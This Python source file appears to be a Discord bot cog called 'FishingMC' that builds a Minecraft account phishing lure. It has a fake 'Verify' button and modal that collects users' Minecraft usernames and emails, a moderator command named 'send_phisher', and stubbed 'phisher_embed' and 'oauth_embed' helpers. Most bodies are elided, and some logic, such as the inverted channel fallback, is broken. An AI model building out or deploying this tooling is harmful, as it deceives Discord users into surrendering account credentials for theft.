import re
import typing
import requests

import discord
from discord import app_commands
from discord.ext import commands

from utils.checks import *

def get_uuid_from_username(username:str) -> str:
    try:
        response = requests.get(f'https://api.mojang.com/users/profiles/minecraft/{username}')
        response.raise_for_status()
    except requests.HTTPError:
        return None
    return response.json()['id']

def phisher_embed() -> discord.Embed:
    ...

def oauth_embed() -> discord.Embed:
    ...

class VeryficationForm(discord.ui.Modal, title="Verifycation"):
    username = discord.ui.TextInput(
        label="Minecraft Username",
        required=True,
        placeholder="Minecraft Username.",
        min_length=3,
        max_length=16
    )
    email = discord.ui.TextInput(
        label="Minecraft Email",
        required=True,
        placeholder="Minecraft Email.",
        min_length=3,
        max_length=60
    )
    
    async def on_submit(self, interaction: discord.Interaction) -> None:
        ...
    
    @staticmethod
    def validate_email(email: str) -> bool:
        email_regex = r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$'
        return re.match(email_regex, email)

class VerifyButtonView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Verify", custom_id="button-verify", style=discord.ButtonStyle.primary, emoji="✅")
    async def button_callback(self, interaction: discord.Interaction):
        await interaction.response.send_modal(VeryficationForm())

class FishingMC(commands.Cog):
    def __init__(self, bot:commands.Bot) -> None:
        self.bot = bot
        
        self.apikey = bot.config['apikey'].get('hypixel', None)
    
    @app_commands.command()
    @mod_or_permissions()
    async def send_phisher(
        self,
        interaction: discord.Interaction,
        channel: typing.Optional[discord.TextChannel]
        ) -> None:
        channel = channel if not channel else interaction.channel

async def setup(bot:commands.Bot) -> None:
    await bot.add_cog(FishingMC(bot))